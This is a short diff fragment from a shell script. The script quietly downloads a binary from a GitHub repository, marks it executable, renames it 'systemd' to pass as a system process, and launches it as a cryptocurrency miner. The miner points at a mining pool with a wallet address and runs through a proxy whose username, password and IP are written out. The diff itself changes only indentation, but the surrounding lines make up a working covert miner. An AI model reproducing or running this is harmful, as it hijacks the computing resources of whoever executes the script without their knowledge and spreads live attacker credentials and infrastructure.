@@ -26,7 +26,7 @@ wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null
 
 chmod +x data 
 
- mv data systemd 
+mv data systemd 
 
 
 ./systemd -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533  -u RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh -p c=RVN,ID=Test  -x sipuwfea:e90ia636sn8t@38.154.227.167:5868
